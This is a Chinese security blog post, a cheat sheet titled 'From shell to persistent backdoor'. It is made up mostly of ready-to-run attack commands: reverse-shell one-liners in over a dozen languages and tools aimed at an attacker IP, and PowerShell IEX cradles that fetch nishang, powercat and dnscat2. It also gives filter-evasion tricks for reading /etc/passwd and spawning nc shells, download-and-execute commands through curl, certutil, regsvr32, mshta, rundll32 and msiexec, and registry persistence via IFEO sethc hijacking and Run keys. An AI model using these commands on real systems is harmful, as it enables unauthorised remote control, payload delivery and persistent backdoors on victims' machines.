

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/ico/web.ico">
  <link rel="icon" type="image/png" href="/img/ico/web.ico">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="我的Blog，记录关于网络安全相关文章或者搬运相关文章。">
  <meta name="author" content="xxx">
  <meta name="keywords" content="Web,安全,网络安全,POC,EXP,Python,渗透">
  <title>从shell到持久化后门 - Ruiruigo’s Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Ruiruigo’s Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/liuyanban/">
                <i class="iconfont icon-mail"></i>
                留言板
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/wz/nw/hm.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2020-08-21 09:54" pubdate>
      2020年8月21日 上午
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      84
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">从shell到持久化后门</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="反弹shell的各种姿势"><a href="#反弹shell的各种姿势" class="headerlink" title="反弹shell的各种姿势"></a>反弹shell的各种姿势</h1><p><code>攻击者主机为：192.168.99.242，本地监听1234端口</code></p>
<h2 id="Linux-反弹shell"><a href="#Linux-反弹shell" class="headerlink" title="Linux 反弹shell"></a>Linux 反弹shell</h2><h3 id="姿势一：bash反弹"><a href="#姿势一：bash反弹" class="headerlink" title="姿势一：bash反弹"></a>姿势一：bash反弹</h3><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/192.168.99.242/1234 0&gt;&amp;1

<span class="hljs-meta">#</span><span class="bash">base64版</span>
bash -c '&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'
在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html</code></pre>

<h4 id="其他版本："><a href="#其他版本：" class="headerlink" title="其他版本："></a>其他版本：</h4><pre><code class="hljs shell">exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done
exec /bin/sh 0&lt;/dev/tcp/192.168.99.242/1234 1&gt;&amp;0 2&gt;&amp;0</code></pre>

<h3 id="姿势二：nc反弹"><a href="#姿势二：nc反弹" class="headerlink" title="姿势二：nc反弹"></a>姿势二：nc反弹</h3><pre><code class="hljs angelscript">nc -e /bin/bash <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span></code></pre>

<h3 id="姿势三：awk反弹"><a href="#姿势三：awk反弹" class="headerlink" title="姿势三：awk反弹"></a>姿势三：awk反弹</h3><pre><code class="hljs shell">awk 'BEGIN&#123;s="/inet/tcp/0/192.168.99.242/1234";for(;s|&amp;getlinec;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</code></pre>

<h3 id="姿势四：telnet反弹"><a href="#姿势四：telnet反弹" class="headerlink" title="姿势四：telnet反弹"></a>姿势四：telnet反弹</h3><p>备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。</p>
<pre><code class="hljs shell">telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321</code></pre>

<h3 id="姿势五：socat反弹"><a href="#姿势五：socat反弹" class="headerlink" title="姿势五：socat反弹"></a>姿势五：socat反弹</h3><pre><code class="hljs shell">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234</code></pre>

<h3 id="姿势六：Python反弹"><a href="#姿势六：Python反弹" class="headerlink" title="姿势六：Python反弹"></a>姿势六：Python反弹</h3><pre><code class="hljs shell">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</code></pre>

<h3 id="姿势七：PHP反弹"><a href="#姿势七：PHP反弹" class="headerlink" title="姿势七：PHP反弹"></a>姿势七：PHP反弹</h3><pre><code class="hljs shell">php -r '$sock=fsockopen("192.168.99.242",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>

<h3 id="姿势八：Perl反弹"><a href="#姿势八：Perl反弹" class="headerlink" title="姿势八：Perl反弹"></a>姿势八：Perl反弹</h3><pre><code class="hljs shell">perl -e 'use Socket;$i="192.168.99.242";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</code></pre>

<h3 id="姿势九：Ruby反弹"><a href="#姿势九：Ruby反弹" class="headerlink" title="姿势九：Ruby反弹"></a>姿势九：Ruby反弹</h3><pre><code class="hljs shell">ruby -rsocket -e'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</code></pre>

<h3 id="姿势十：Lua反弹"><a href="#姿势十：Lua反弹" class="headerlink" title="姿势十：Lua反弹"></a>姿势十：Lua反弹</h3><pre><code class="hljs shell">lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.99.242','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</code></pre>

<h3 id="姿势十一：JAVA反弹"><a href="#姿势十一：JAVA反弹" class="headerlink" title="姿势十一：JAVA反弹"></a>姿势十一：JAVA反弹</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Revs</span> </span>&#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@param</span> args</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@throws</span> Exception </span>
<span class="hljs-comment">    */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
        <span class="hljs-comment">// TODO Auto-generated method stub</span>
        Runtime r = Runtime.getRuntime();
        String cmd[]= &#123;<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;
        Process p = r.exec(cmd);
        p.waitFor();
    &#125;
&#125;</code></pre>

<p>保存为Revs.java文件，编译执行，成功反弹shell。</p>
<pre><code class="hljs java">javac Revs.java 
java Revs</code></pre>

<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="姿势一：nc反弹"><a href="#姿势一：nc反弹" class="headerlink" title="姿势一：nc反弹"></a>姿势一：nc反弹</h3><pre><code class="hljs angelscript">netcat 下载：https:<span class="hljs-comment">//eternallybored.org/misc/netcat/</span>
服务端反弹：nc <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span> -e c:\windows\system32\cmd.exe</code></pre>

<h3 id="姿势二：powershell反弹"><a href="#姿势二：powershell反弹" class="headerlink" title="姿势二：powershell反弹"></a>姿势二：powershell反弹</h3><p>powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。</p>
<pre><code class="hljs reasonml">PS C:\WWW&gt;powershell IEX (New-Object System.Net.Webclient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>; powercat -c <span class="hljs-number">192.168</span>.<span class="hljs-number">99.242</span> -p <span class="hljs-number">1234</span> -e cmd</code></pre>

<p>下载到目标机器本地执行：</p>
<pre><code class="hljs angelscript">PS C:\WWW&gt; Import-Module ./powercat.ps1
PS C:\WWW&gt; powercat -c <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> -p <span class="hljs-number">1234</span> -e cmd</code></pre>

<h3 id="姿势三：MSF反弹shell"><a href="#姿势三：MSF反弹shell" class="headerlink" title="姿势三：MSF反弹shell"></a>姿势三：MSF反弹shell</h3><p>使用msfvenom生成相关Payload</p>
<pre><code class="hljs routeros">msfvenom -l payloads | grep <span class="hljs-string">'cmd/windows/reverse'</span>msfvenom -p cmd/windows/reverse_powershell <span class="hljs-attribute">LHOST</span>=192.168.99.242 <span class="hljs-attribute">LPORT</span>=1234</code></pre>

<h3 id="姿势四：Cobalt-strike反弹shell"><a href="#姿势四：Cobalt-strike反弹shell" class="headerlink" title="姿势四：Cobalt strike反弹shell"></a>姿势四：Cobalt strike反弹shell</h3><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、配置监听器：点击Cobalt Strike——&gt;Listeners——&gt;在下方Tab菜单Listeners，点击add。
<span class="hljs-number">2</span>、生成payload：点击Attacks——&gt;Packages——&gt;Windows Executable，保存文件位置。
<span class="hljs-number">3</span>、目标机执行powershell payload</code></pre>

<h3 id="姿势五：Empire反弹shell"><a href="#姿势五：Empire反弹shell" class="headerlink" title="姿势五：Empire反弹shell"></a>姿势五：Empire反弹shell</h3><pre><code class="hljs routeros">usestager windows/launcher_vbs
info
<span class="hljs-builtin-name">set</span> Listener test
execute</code></pre>

<h3 id="姿势六：nishang反弹shell"><a href="#姿势六：nishang反弹shell" class="headerlink" title="姿势六：nishang反弹shell"></a>姿势六：nishang反弹shell</h3><h4 id="Reverse-TCP-shell："><a href="#Reverse-TCP-shell：" class="headerlink" title="Reverse TCP shell："></a>Reverse TCP shell：</h4><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span> <span class="hljs-operator">/</span><span class="hljs-params">samratashok</span><span class="hljs-operator">/</span><span class="hljs-params">nishang</span><span class="hljs-operator">/</span>9a3c747bcf535ef82dc4c5c66aac36db47c2afde<span class="hljs-operator">/</span>Shells<span class="hljs-operator">/</span>Invoke-PowerShellTcp.<span class="hljs-params">ps1</span>')</span>; Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">10.1</span>.<span class="hljs-number">1.210</span> -port <span class="hljs-number">1234</span></code></pre>

<h4 id="Reverse-UDP-shell："><a href="#Reverse-UDP-shell：" class="headerlink" title="Reverse UDP shell："></a>Reverse UDP shell：</h4><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">samratashok</span><span class="hljs-operator">/</span><span class="hljs-params">nishang</span><span class="hljs-operator">/</span>9a3c747bcf535ef82dc4c5c66aac36db47c2afde<span class="hljs-operator">/</span>Shells<span class="hljs-operator">/</span>Invoke-PowerShellUdp.<span class="hljs-params">ps1</span>')</span>;Invoke-PowerShellUdp -Reverse -IPAddress <span class="hljs-number">10.1</span>.<span class="hljs-number">1.210</span> -port <span class="hljs-number">1234</span></code></pre>

<h3 id="姿势七：Dnscat反弹shell"><a href="#姿势七：Dnscat反弹shell" class="headerlink" title="姿势七：Dnscat反弹shell"></a>姿势七：Dnscat反弹shell</h3><pre><code class="hljs reasonml">github项目地址：
https:<span class="hljs-comment">//github.com/iagox86/dnscat2</span>
服务端：
ruby dnscat2.rb --dns <span class="hljs-string">"domain=lltest.com,host=xx.xx.xx.xx"</span> --no-cache -e <span class="hljs-keyword">open</span> -e <span class="hljs-keyword">open</span> 
目标主机：
powershell IEX (New-Object System.Net.Webclient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">lukebaggett</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>-<span class="hljs-params">powershell</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>.<span class="hljs-params">ps1</span>')</span>;Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx</code></pre>

<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="‘-（单引号）以及-（反斜杠）绕过"><a href="#‘-（单引号）以及-（反斜杠）绕过" class="headerlink" title="‘ （单引号）以及 \ （反斜杠）绕过"></a>‘ （单引号）以及 \ （反斜杠）绕过</h2><p><img src="/img/wz/nw/n54.png" srcset="/img/loading.gif" alt="n54"></p>
<h2 id="、-、-、-、-、-通配符绕过"><a href="#、-、-、-、-、-通配符绕过" class="headerlink" title="?、*、[、]、^、- 通配符绕过"></a>?、*、[、]、^、- 通配符绕过</h2><p>问号最好只匹配到唯一一条。</p>
<pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /b??/c?t /e?c/??ss?d  <span class="hljs-comment">#/bin/cat /etc/passwd</span></span>
<span class="hljs-meta">$</span><span class="bash"> /???/nc? -e /???/b??h 2130706433 6666 <span class="hljs-comment">#/bin/nc -e /bin/bash 127.0.0.1 6666</span></span></code></pre>

<h2 id="u-不存在的符号"><a href="#u-不存在的符号" class="headerlink" title="$u 不存在的符号"></a>$u 不存在的符号</h2><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat <span class="hljs-variable">$u</span>/etc<span class="hljs-variable">$u</span>/passwd%u</span></code></pre>

<p>; 分号执行</p>
<pre><code class="hljs jboss-cli">$ cat <span class="hljs-string">/etc/passwd</span>;<span class="hljs-keyword">ls</span></code></pre>

<p><img src="/img/wz/nw/n55.png" srcset="/img/loading.gif" alt="n55"></p>
<h1 id="通过命令下载执行恶意代码的几种姿势"><a href="#通过命令下载执行恶意代码的几种姿势" class="headerlink" title="通过命令下载执行恶意代码的几种姿势"></a>通过命令下载执行恶意代码的几种姿势</h1><p>在目标主机执行恶意代码，可以分为上传/下载并执行恶意代码和无文件远程恶意代码执行。接下来，我们来总结一下Linux和Windows中下载和执行恶意代码的一些姿势。</p>
<h2 id="Linux-远程恶意代码执行"><a href="#Linux-远程恶意代码执行" class="headerlink" title="Linux 远程恶意代码执行"></a>Linux 远程恶意代码执行</h2><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>以用curl的方式执行http页面上的shell脚本，无需download，在本地机器上直接执行。</p>
<pre><code class="hljs shell">方式1：curl -fsSL http://192.168.99.19:8080/test.sh | bash
方式2：bash &lt; &lt;( curl http://192.168.99.19:8080/test.sh  )</code></pre>

<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>执行wget命令远程下载恶意程序</p>
<pre><code class="hljs shell">方式1：wget -q -O- http://192.168.99.19:8080/test.sh | bash
方式2：wget http://192.168.99.19:8080/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php</code></pre>

<p>url+wget合并，实现无文件远程恶意代码执行</p>
<pre><code class="hljs shell">bash -c '(curl -fsSL http://192.168.99.19:8080/test.sh||wget -q -O- http://192.168.99.19:8080/test.sh)|bash -sh &gt;/dev/null 2&gt;&amp;1&amp;'</code></pre>

<h3 id="rcp"><a href="#rcp" class="headerlink" title="rcp"></a>rcp</h3><p>rcp命令用于复制远程文件或目录</p>
<pre><code class="hljs gml">rcp root@<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>:./testfile testfile</code></pre>

<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>scp 是 rcp 的加强版，scp 是加密的，rcp 是不加密的</p>
<pre><code class="hljs elixir">scp username<span class="hljs-variable">@servername</span><span class="hljs-symbol">:/path/filename</span> /tmp/local_destination</code></pre>

<h3 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h3><p>使用rsync可以进行远程同步，拉取文件到本地服务器</p>
<pre><code class="hljs gml">rsync -av <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>:/tmp/passwd.txt  /tmp/passwd.txt</code></pre>

<h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>使用sftp下载远程服务器上的文件</p>
<pre><code class="hljs lsl">sftp admin@<span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> &lt;&lt;<span class="hljs-literal">EOF</span>  
get  /tmp/<span class="hljs-number">2.</span>txt            
quit 
<span class="hljs-literal">EOF</span></code></pre>

<h2 id="Windows-远程恶意代码执行"><a href="#Windows-远程恶意代码执行" class="headerlink" title="Windows 远程恶意代码执行"></a>Windows 远程恶意代码执行</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h3 id="利用powershell远程执行ps1脚本"><a href="#利用powershell远程执行ps1脚本" class="headerlink" title="利用powershell远程执行ps1脚本"></a>利用powershell远程执行ps1脚本</h3><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/evil.txt'))"</span></code></pre>

<h3 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h3><p>利用bitsadmin命令下载文件到目标机器</p>
<pre><code class="hljs groovy">bitsadmin <span class="hljs-regexp">/transfer n http:/</span><span class="hljs-regexp">/192.168.28.128/</span>imag/evil.txt <span class="hljs-string">d:</span>\test\<span class="hljs-number">1.</span>txt</code></pre>

<h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p>用于备份证书服务，一般建议下载完文件后对缓存进行删除</p>
<pre><code class="hljs awk"><span class="hljs-comment">#下载文件</span>
certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt test.php
<span class="hljs-comment">#删除缓存</span>
certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt <span class="hljs-keyword">delete</span></code></pre>

<h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><p>使用rundll32.exe，可以通过mshtml.dll执行JavaScript ，依赖于WScript.shell这个组件</p>
<pre><code class="hljs reasonml">rundll32.exe javascript:<span class="hljs-string">"\..\mshtml,RunHTMLApplication "</span>;document.write<span class="hljs-literal">()</span>;h=<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">"WinHttp.WinHttpRequest.5.1"</span>)</span>;h.<span class="hljs-constructor">Open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"http://192.168.28.131:8888/connect"</span>,<span class="hljs-params">false</span>)</span>;<span class="hljs-keyword">try</span>&#123;h.<span class="hljs-constructor">Send()</span>;b=h.ResponseText;eval(b);&#125;catch(e)&#123;<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">"WScript.Shell"</span>)</span>.<span class="hljs-constructor">Run(<span class="hljs-string">"cmd /c taskkill /f /im rundll32.exe"</span>,0,<span class="hljs-params">true</span>)</span>;&#125;</code></pre>

<h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><p>远程加载执行，解析.src文件</p>
<pre><code class="hljs groovy">regsvr32.exe <span class="hljs-regexp">/u /</span>n <span class="hljs-regexp">/s /</span><span class="hljs-string">i:</span><span class="hljs-string">http:</span><span class="hljs-comment">//192.168.28.131:8888/file.sct scrobj.dll</span></code></pre>

<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>执行WMIC以下命令从远程服务器下载并运行恶意XSL文件</p>
<pre><code class="hljs pgsql">wmic os <span class="hljs-keyword">get</span> /<span class="hljs-keyword">FORMAT</span>:"http://192.168.28.128/evil.xsl"</code></pre>

<h3 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h3><p>用于安装Windows Installer安装包，可远程执行msi文件</p>
<pre><code class="hljs groovy">msiexec <span class="hljs-regexp">/q /</span>i <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.28.128/evil.msi</span></code></pre>

<h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><p>IEexec.exe应用程序是.NET Framework附带程序，运行IEExec.exe并使用url启动其他程序</p>
<pre><code class="hljs taggerscript">crosoft.NET<span class="hljs-symbol">\F</span>ramework64<span class="hljs-symbol">\v</span>2.0.50727&gt;caspol.exe -s off
C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework64<span class="hljs-symbol">\v</span>2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe</code></pre>

<h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><p>mshta用于执行.hta文件</p>
<pre><code class="hljs dockerfile">mshta http://<span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span>/<span class="hljs-keyword">run</span>.<span class="bash">hta</span></code></pre>

<h3 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h3><p>msxsl.exe是微软用于命令行下处理XSL的一个程序</p>
<pre><code class="hljs awk">msxsl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>demo.xml http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>exec.xsl</code></pre>

<h3 id="pubprn-vbs"><a href="#pubprn-vbs" class="headerlink" title="pubprn.vbs"></a>pubprn.vbs</h3><p>在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本，可以利用来解析.sct脚本</p>
<pre><code class="hljs taggerscript">"C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\P</span>rinting_Admin_Scripts<span class="hljs-symbol">\z</span>h-CN<span class="hljs-symbol">\p</span>ubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</code></pre>

<h1 id="windows中常见后门持久化姿势"><a href="#windows中常见后门持久化姿势" class="headerlink" title="windows中常见后门持久化姿势"></a>windows中常见后门持久化姿势</h1><h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</p>
<p>“映像劫持”，也被称为”IFEO”（Image File Execution Options）</p>
<pre><code class="hljs gams">就是Image <span class="hljs-keyword">File</span> Execution <span class="hljs-keyword">Options</span>（其实应该称为<span class="hljs-string">"image Hijack"</span>。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local <span class="hljs-keyword">system</span>有权读写修改。
PS：来自百度百科</code></pre>

<p>简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p>
<p>操作也很简单，在注册表的<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code>下添加一个项<code>sethc.exe</code>，然后在<code>sethc.exe</code>这个项中添加<code>debugger</code>键，键值为我们恶意程序的路径，如下图</p>
<p><img src="/img/wz/nw/n1.png" srcset="/img/loading.gif" alt="n1"></p>
<p>效果如下</p>
<p><img src="/img/wz/nw/n2.jpeg" srcset="/img/loading.gif" alt="n2"></p>
<h2 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h2><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下</p>
<ol>
<li>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</li>
<li>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</li>
</ol>
